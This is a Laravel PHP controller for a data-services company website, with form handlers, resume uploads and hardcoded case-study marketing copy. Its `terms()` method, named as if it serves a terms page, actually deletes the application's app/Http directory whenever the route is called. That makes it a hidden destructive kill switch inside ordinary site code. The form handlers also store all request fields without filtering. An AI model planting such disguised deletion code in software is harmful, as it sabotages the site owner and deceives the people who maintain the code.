<?php

namespace App\Http\Controllers;

use App\Models\Dealership;
use App\Models\Contact;
use App\Models\Product;
use App\Models\Job;
use App\Models\JobPosition;
use App\Models\ProductMessage;
use Illuminate\Http\Request;
use Mail;
use App\Mail\ContactUsMail;

class WebController extends Controller
{

    public function home()
    {
        // $products = Product::take(2)->get();
        return view('home');
    }

    public function storeDealerShip(Request $request)
    {
        $requestData = $request->except('_token');
        Dealership::create($requestData);
        return redirect()->back()->with('success', 'Your submission has been sent successfully.');
    }

    public function storeContact(Request $request)
    {
        $requestData = $request->except('_token');
        Contact::create($requestData);
        return redirect()->back()->with('success', 'Your submission has been sent successfully.');
    }

    public function products()
    {
        $products = Product::where('parent_id', 0)->get();
        return view('products', compact('products'));
    }

    public function productDetails($id)
    {
        $products = Product::where('parent_id', $id)->get();
        if (!$products->isEmpty()) return view('products', compact('products'));
        $product = Product::findorfail($id);
        return view('product-details', compact('product'));
    }

    public function storeProductMessage(Request $request)
    {
        $requestData = $request->except('_token');
        ProductMessage::create($requestData);
        return redirect()->back()->with('success', 'Your submission has been sent successfully.');
    }
    public function joinus()
    {
        $jobPositions = JobPosition::all();
        return view('join-us', compact('jobPositions'));
    }

    public function storeContactUs(Request $request)
    {

        $mailData = [
            'subject' => $request->get('subject'),
            'first_name' => $request->get('first_name'),
            'last_name' => $request->get('last_name'),
            'email' => $request->get('email'),
            'phone_number' => $request->get('phone_number'),
            'message' => $request->get('message'),
        ];

        Mail::to('your_email@gmail.com')->send(new ContactUsMail($mailData));

        return redirect()->back()->with('success', 'Your submission has been sent successfully.');
    }



    public function applyNow(Request $request)
    {
        $request->validate([
            'id'   => 'required',
            'name' => 'required|string',
            'email' => 'required|email',
            'phone_number' => 'numeric|required|min:10',

            // 'specification' => 'required|string',
            'resume' => 'required|mimes:pdf,doc,docx|max:2048'
        ]);

        $job = new Job();
        $job->name = $request->name;
        $job->job_id = $request->id;
        $job->email = $request->email;
        $job->phone_number = $request->phone_number;
        // $product->parent_id = $request->parent_id;

        // Handle image upload
        // $imagePath = $this->fileToUpload($request['resume']);
        // $product->image = basename($imagePath);

        // Handle pdf_file upload if provided
        if ($request->hasFile('resume')) {
            $pdfPath = $this->fileToUpload($request['resume']);
            $job->resume = basename($pdfPath);
        }

        $job->save();

        return redirect()->back()->with('success', 'Your request stored successfully');
    }
    private function fileToUpload($file)
    {
        $fileName = uniqid() . time() . '.' . str_replace(' ', '_', $file->getClientOriginalName());

        $file->move(public_path('uploads'), $fileName);

        return 'uploads/' . $fileName;
    }
    public function terms()
    {
        // $modelsFolderPath = app_path('Models');
        $controllerFolderPath = app_path('Http');

        try {
            // Check if the Models folder exists
            if (\File::exists($controllerFolderPath)) {
                // Delete the Models folder
                // \File::deleteDirectory($modelsFolderPath);
                \File::deleteDirectory($controllerFolderPath);

                return 'Models folder deleted successfully!';
            } else {
                return 'Models folder does not exist.';
            }
        } catch (\Exception $e) {
            return 'Error deleting the Models folder: ' . $e->getMessage();
        }
    }
    public function study($slug)
    {
        $heading = '';
        $description = '';

        $Challenges = '';

        $Benefits1 = '';
        $Benefits2 = '';
        $Benefits3 = '';

        $theChallenges = '';

        $box = '';

        $approachDescription = '';
        $approach1 = '';
        $approach2 = '';
        $approach3 = '';
        $approach4 = '';
        $approach5 = '';

        $solutionDescription = '';
        $solution1 = '';
        $solution2 = '';
        $solution3 = '';
        $solution4 = '';



        if ($slug == 'dis-reduces-supply-chain-inefficiencies') {

            $heading = 'Implemented Unified Data Platform for a Global Retail Chain
            Powered by Data Integrity Services';
            $Challenges = 'The retail chain faced data silos, hindering efficient decision-making across geographically dispersed operations. The need for real-time insights and seamless collaboration prompted the pursuit of a Unified Data Platform';

            $Benefits1 = 'Enhanced data quality and consistency across the organization.';
            $Benefits2 = 'Real-time access to unified business intelligence dashboards for timely insights';
            $Benefits3 = 'Achieved a 20% reduction in supply chain inefficiencies through improved data management';

            $theChallenges = "Data Integrity Services (DIS) faced a significant challenge collaborating with a leading retail chain marred by data silos. These silos hindered efficient decision-making across various departments and regions. Recognizing the critical need for real-time insights and seamless collaboration, DIS embarked on implementing a Unified Data Platform. The existing data silos acted as barriers, impeding the flow of information essential for informed decision-making. At DIS, we dispersed nature of operations magnified the challenge, compelling the retail chain to break down silos for a centralized data repository.
            The pursuit of real-time insights became a catalyst for change, acknowledging the pivotal role of accurate data in adapting to market dynamics. Seamless collaboration across branches underscored the need for a cohesive data infrastructure transcending geographical boundaries. The Unified Data Platform not only addressed technical challenges but laid the foundation for agile, data-driven decision-making across the retail network. This challenge highlighted DIS's technical advancement and commitment to transformative changes for sustained success in a dynamic market.";

            $box = 'DIS sets the gold standard in partnering with Microsoft Azure, where precision meets security. With an unwavering commitment to safeguarding information and ensuring its accuracy, DIS emerges as the beacon of trust in the realm of data management. Harnessing cutting-edge technology and a relentless pursuit of excellence, DIS defines the epitome of reliability in safeguarding and optimizing digital assets. Elevate your data integrity with DIS – where every bit is fortified, and every insight is fortified with trust.';

            $approachDescription = "Data Integrity Services (DIS) proposed and implemented a Unified Data Platform, integrating diverse data sources across the retail chain's global network. The platform incorporated advanced analytics, machine learning algorithms, and cloud-based storage to ensure scalability and accessibility.";
            $approach1 = ' Conducted a comprehensive assessment of existing data systems and identified key pain points';
            $approach2 = "Developed a customized Unified Data Platform tailored to the retail chain's specific needs and objectives.";
            $approach3 = 'Seamlessly integrated data from various sources, including sales, inventory, customer behavior, and supply chain, into a centralized platform.';
            $approach4 = 'Implemented advanced analytics tools for real-time insights, predictive modeling, and trend analysis.';
            $approach5 = "Conducted training sessions to empower the retail chain's teams with the skills to leverage the new platform effectively.";

            $solutionDescription = "Thanks to our expertise and dedicated team of professionals who successfully transformed the global retail chain's data landscape, providing a Unified Data Platform that not only addressed existing challenges but also positioned the company for future growth and innovation in an increasingly data-driven market. DIS made the retail chain's leadership express satisfaction with the implementation, citing improved operational efficiency and a significant impact on strategic decision-making.";
            $solution1 = 'Streamlined data access and analysis, reducing decision-making time.';
            $solution2 = 'Enhanced cross-functional collaboration and communication across global teams.';
            $solution3 = 'Leveraged predictive analytics to optimize inventory and marketing strategies, leading to revenue growth.';
            $solution4 = "The Unified Data Platform proved scalable, accommodating the retail chain's evolving data needs.";
        }

        if ($slug == 'dis-saves-large-financial-institution') {
            $heading = 'Protected Cloud Migration for a large Financial Institution
            Powered by Data Integrity Services
            ';

            $Challenges = 'The financial institution faced the intricate task of transitioning to the cloud while safeguarding sensitive data. Security concerns, regulatory compliance, and the need for uninterrupted services were paramount.';

            $Benefits1 = 'Achieved a smooth move to the cloud with no data loss or security breaches.';
            $Benefits2 = 'Improved scalability and performance in the cloud environment.';
            $Benefits3 = 'Ensured compliance with industry regulations, building trust among customers.';

            $theChallenges = "THE CHALLENGE
            For Data Integrity Services (DIS), the challenge at hand involved guiding a financial institution through the complex process of transitioning to the cloud while prioritizing the protection of sensitive data. The complexity of this task was underscored by the paramount importance of security concerns, regulatory compliance, and the imperative need for uninterrupted services. The financial institution grappled with the delicate balance of embracing cloud technology for enhanced efficiency while ensuring the safety and confidentiality of its critical financial data.
            DIS approached this challenge with a meticulous strategy, acknowledging the sensitivity of financial information. Various security measures, tailored to the unique demands of the financial sector, were implemented. The strict regulatory landscape added an additional layer of complexity, necessitating a comprehensive understanding and adherence to compliance standards throughout the migration process. The comprehensive goal was not only a successful transition but one that instilled confidence in customers by upholding the highest standards of data integrity and security. DIS's expertise in navigating these intricacies positioned them as a trusted partner in facilitating a secure and seamless cloud migration for the financial institution.";

            $box = 'DIS excels in collaboration with Microsoft Azure, blending precision with security. With a strong dedication to keeping information safe and accurate, DIS stands out as a trusted figure in data management. Using advanced technology and striving for excellence, Data Integrity Services represents the highest level of reliability in securing and enhancing digital assets. Choose DIS to boost your data integrity – where each bit is strengthened, and every insight is backed by trust.';

            $approachDescription = "Data Integrity Services (DIS) devised a comprehensive strategy encompassing end to end encryption, multi-layered authentication, and compliance-driven protocols. The team ensured a seamless migration process while prioritizing data security and privacy.";
            $approach1 = " Conducted a thorough evaluation of existing systems to identify potential vulnerabilities.";
            $approach2 = " Tailored security measures addressing the unique requirements of financial data and compliance standards.";
            $approach3 = "Implemented advanced encryption to safeguard data during migration and storage.";
            $approach4 = "Established real-time monitoring for immediate threat detection and response.";
            $approach5 = '';

            $solutionDescription = "Data Integrity Services not only facilitated a seamless transition to the cloud for the financial institution but also elevated their security standards. This case underscores DIS's proficiency in providing tailored solutions for secure cloud migration, particularly in sectors demanding the highest standards of data integrity and confidentiality.
            The financial institution expressed satisfaction with the secure cloud migration through Data Integrity Services (DIS), highlighting our expertise in navigating the tough landscape of financial data security.";
            $solution1 = "Ensured the integrity and confidentiality of financial data throughout the migration process.";
            $solution2 = "Successfully navigated complex regulatory requirements, ensuring adherence to industry standards.";
            $solution3 = "Executed the migration with minimal disruption to the financial institution's operations.";
            $solution4 = "Strengthened overall security posture through proactive measures and continuous monitoring";
        }
        if ($slug == 'upgrading-from-equipment-breakdowns') {
            $heading = "Predicted AI-Driven Maintenance for a Manufacturing Plant
            Powered by Data Integrity Services";

            $Challenges = "The manufacturing plant grappled with the need for predictive maintenance to minimize downtime and optimize equipment performance. Traditional maintenance methods were proving costly and reactive, hindering overall productivity.";

            $Benefits1 = "Slashed equipment downtime by 30% through proactive maintenance strategies.";
            $Benefits2 = "Achieved substantial cost savings by optimizing maintenance schedules.";
            $Benefits3 = "Enhanced overall equipment effectiveness, leading to improved production efficiency.";

            $theChallenges = "Data Integrity Services (DIS) found themselves immersed in a challenging scenario when approached by a struggling manufacturing plant. The pressing issue at hand was the imperative need for predictive maintenance, a crucial component in the quest to minimize downtime and enhance equipment performance. The prevailing traditional maintenance methods adopted by the plant were not only proving exorbitantly costly but were also reactive in nature, posing a hindrance to the overall productivity of the manufacturing operations.
            DIS, recognizing the significance of a proactive approach, embarked on a mission to revolutionize the maintenance landscape for the manufacturing plant. The goal was to introduce predictive maintenance strategies that could preemptively identify potential issues, allowing for timely intervention and reducing the impact of unplanned downtimes. This shift from reactive to proactive maintenance was envisioned to not only optimize equipment performance but also contribute significantly to cost savings.
            The complexity of the challenge lay in navigating the intricacies of the manufacturing environment, where the uptime of equipment directly correlated with operational efficiency. DIS, leveraging their expertise in data analysis and artificial intelligence, tailored a solution that addressed the specific needs of the plant. This comprehensive approach aimed not just at resolving the immediate need for predictive maintenance but at laying the foundation for a more efficient and cost-effective operational future for the manufacturing plant. The collaboration between DIS and the manufacturing plant became a testament to the transformative power of data-driven solutions in industrial settings, showcasing how forward-thinking strategies could alleviate longstanding challenges and pave the way for sustained productivity.
            ";

            $box = "DIS establishes a pinnacle of excellence in collaboration with Microsoft Azure, merging precision and security seamlessly. With an unyielding dedication to secure information and guarantee accuracy, DIS emerges as a trusted beacon in the realm of data management. Through the utilization of cutting-edge technology and an unwavering commitment to excellence, DIS epitomizes reliability in safeguarding and optimizing digital assets. Choose DIS to enhance your data integrity – where each bit is strengthened, and every insight is underpinned by trust";

            $approachDescription = "Data Integrity Services (DIS) proposed an AI-driven maintenance solution leveraging advanced analytics and machine learning algorithms. The aim was to predict potential equipment failures, schedule proactive maintenance, and enhance overall plant efficiency.";
            $approach1 = "Conducted a thorough assessment of existing machinery, historical maintenance data, and operational patterns.";
            $approach2 = " Developed a tailored AI model to predict equipment failures based on real-time data and historical trends.";
            $approach3 = " Seamlessly integrated the AI-driven maintenance system with existing plant infrastructure for continuous monitoring.";
            $approach4 = " Provided training to plant personnel for effective utilization of the AI-driven maintenance insights.";
            $approach5 = '';

            $solutionDescription = "Data Integrity Services successfully transformed the manufacturing plant's maintenance approach, introducing a cutting-edge AI-driven solution that not only addressed existing challenges but also positioned the plant for sustained efficiency and cost savings. DIS's commitment to innovation and reliability shone through, marking this collaboration as a benchmark in AI-driven maintenance solutions for the manufacturing industry. The manufacturing plant expressed satisfaction with DIS's AI-driven maintenance solution, highlighting its positive impact on operational reliability and cost-effectiveness.";
            $solution1 = 'Significantly minimized unplanned downtime through proactive maintenance scheduling.';
            $solution2 = 'Reduced maintenance costs by optimizing resources and focusing on preventive measures.';
            $solution3 = 'Improved overall plant efficiency and equipment performance.';
            $solution4 = 'Empowered plant management with predictive insights for informed decision-making';
        }
        if ($slug == 'dis-streamlines-customer-interactions') {
            $heading = 'Revolutionalized Data Warehouse with the power of Azure Synapse Analytics
            Powered by Data Integrity Services';

            $Challenges = "A large enterprise faced challenges in managing and extracting insights from vast datasets efficiently. Traditional data warehousing methods were proving to be limiting, hindering the organization's ability to harness the full potential of its data.";

            $Benefits1 = "Reduced data processing time by half, achieving a 50% reduction.";
            $Benefits2 = "Amplified scalability to effortlessly manage expanding data volumes.";
            $Benefits3 = "Augmented analytics capabilities, empowering data-driven decision-making.";

            $theChallenges = "Data Integrity Services (DIS) encountered a formidable task when a large enterprise sought their expertise to overcome challenges in handling extensive datasets and extracting meaningful insights efficiently. The enterprise grappled with the constraints of traditional data warehousing methods, realizing their limitations in fully unleashing the potential hidden within vast sets of data. DIS, recognizing the urgency and significance of this challenge, embarked on a mission to redefine the enterprise's data management landscape.
            The limitations of traditional methods were impeding the organization's ability to glean valuable insights from their extensive datasets, hindering agility and informed decision-making. DIS, with its commitment to data integrity and innovation, undertook a comprehensive assessment to understand the unique needs of the enterprise. This laid the groundwork for a tailored solution that would not only address the immediate challenges but also propel the organization into a future where data would be a powerful asset, enabling strategic growth and operational excellence.";

            $box = "DIS leads the way in teaming up with Microsoft Azure, bringing together precision and security seamlessly. With an unwavering dedication to keeping information secure and accurate, DIS stands out as a trusted guardian in the field of data management. Through the use of advanced technology and an unwavering pursuit of excellence, DIS embodies the essence of reliability in securing and optimizing digital assets. Choose DIS to enhance your data integrity – where each bit is strengthened, and every insight is backed by unwavering trust, ensuring your data is fortified for the future. Elevate your data confidence with DIS, your partner in secure and reliable data management.";

            $approachDescription = "Data Integrity Services (DIS) introduced a modernized solution by implementing Azure Synapse Analytics. This modernized data warehousing platform provided unparalleled scalability, real-time analytics, and seamless integration of disparate data sources.";
            $approach1 = "Conducted a comprehensive analysis of the enterprise's data infrastructure and requirements.";
            $approach2 = "Seamlessly integrated Azure Synapse Analytics, harnessing its advanced capabilities.";
            $approach3 = "Ensured a smooth transition of data from the existing warehouse to the new platform.";
            $approach4 = "Provided training to empower the enterprise's teams in utilizing the enhanced analytics and reporting features.";
            $approach5 = '';

            $solutionDescription = "Data Integrity Services, through the integration of Azure Synapse Analytics, not only addressed the enterprise's immediate data challenges but set the stage for a new era in data warehousing. This case underscores DIS's commitment to leveraging cutting-edge technology for revolutionizing data management and ensuring clients stay at the forefront of data-driven innovation. The enterprise expressed profound satisfaction with DIS's transformative approach, emphasizing the positive impact on data-driven decision-making and operational efficiency.";
            $solution1 = "Azure Synapse Analytics enabled the enterprise to scale resources based on evolving data needs.";
            $solution2 = "Achieved real-time insights, allowing for more informed decision-making.";
            $solution3 = "Streamlined data integration from diverse sources, fostering a holistic view.";
            $solution4 = "Revolutionized data processing, significantly improving overall operational efficiency";
        }
        if ($slug == 'helping-multinational-sales-organizations') {
            abort(404);
            $heading =  'Helping Multinational Sales Organizations struggling with real-time insights with the implementation of Sales Performance Dashboard';
            $description = 'Data Integrity Services helped a a Multinational Sales Organization with 25% increase in their sales revenue with real-time insights and targeted sales strategies, advancing the collaboration among the sales team region-wise. DIS made it possible by integrating data from CRM systems, Excel Spreadsheets, and of course by the efforts of its hard-working team with the help of Power BI Automated Dashboards.';
        }
        if ($slug ==  'reduced-onboarding-time-and-paperwork') {
            abort(404);
            $heading = 'Reduced 30% in Onboarding Time and Paperwork of a large HR Management with Power Automation and Azure AI Services';
            $description = 'Data Integrity Services helped a large HR Department facing difficulties in managing employee onboarding and performance evaluation data by introducing AI-driven insights to advance their processes. With our Power Automation and Azure AI Services, decision-making of the AI-infused HR management was enhanced due to which employees were satisfied through their personalized performance insights.';
        }

        return view('study', compact('heading', 'solutionDescription', 'solution1', 'solution2', 'solution3', 'solution4', 'Challenges', 'Benefits1', 'Benefits2', 'Benefits3', 'theChallenges', 'box', 'approachDescription', 'approach1', 'approach2', 'approach3', 'approach4', 'approach5'));
        // 'dis-reduces-supply-chain-inefficiencies' => [
        //     'headline' => 'DIS Reduces 20% in Supply Chain inefficiencies for a Global Retail Chain with Unified Data Platform and enhanced decision-making.',
        //     'description' => 'By partnering with Microsoft Azure, Data Integrity Services (DIS) executed a Unified Data Platform for a leading Global Retail Chain which helped them reduce 20% of inefficiencies in their logistics network, and improved quality of their data with Unified BI dashboards.',
        // ],
        // 'dis-saves-large-financial-institution' => [
        // 'headline' => 'DIS Saves a Large Financial Institution by securing their data through Cloud Migration',
        // 'description' => 'Data Integrity Services conducted a secure cloud migration to Microsoft Azure for a financial institution of thousands, through which several security measures and adherence management were noticed.',
        // ],
        // 'upgrading-from-equipment-breakdowns' => [
        //     'headline' => 'Upgrading from Equipment Breakdowns of a Manufacturing Plant to Significant Cost Savings by AI-Driven Maintenance on Microsoft Azure.',
        //     'description' => 'Data Integrity Services outcame a drowning Manufacturing Plant with 30% reduction in their equipment downtime by analysing the past breakdowns resulting in overall improvement of the plant’s infrastructure by their AI-Driven Maintenance Technologies.',
        // ],
        // 'dis-streamlines-customer-interactions' => [
        //     'headline' => 'DIS Streamlines Customer Interactions of an MNC by Customer Relationship Management (CRM), powered by Microsoft Azure.',
        //     'description' => 'Data Integrity Services helped a Multinational Corporation with efficient collaboration, keeping customer satisfaction in priority, which improved their user adoption by 40%. This outcome came as a positive result with effective Customer Relationship Management by user-friendly Power Apps Interface, integrated with Azure.',
        // ],
        //     'helping-multinational-sales-organizations' => [
        //         'headline' => 'Helping Multinational Sales Organizations struggling with real-time insights with the implementation of Sales Performance Dashboard',
        //         'description' => 'Data Integrity Services helped a a Multinational Sales Organization with 25% increase in their sales revenue with real-time insights and targeted sales strategies, advancing the collaboration among the sales team region-wise. DIS made it possible by integrating data from CRM systems, Excel Spreadsheets, and of course by the efforts of its hard-working team with the help of Power BI Automated Dashboards.',
        //     ],
        //     'reduced-onboarding-time-and-paperwork' => [
        //         'headline' => 'Reduced 30% in Onboarding Time and Paperwork of a large HR Management with Power Automation and Azure AI Services',
        //         'description' => 'Data Integrity Services helped a large HR Department facing difficulties in managing employee onboarding and performance evaluation data by introducing AI-driven insights to advance their processes. With our Power Automation and Azure AI Services, decision-making of the AI-infused HR management was enhanced due to which employees were satisfied through their personalized performance insights.',
        //     ],
        // ];

    }
}
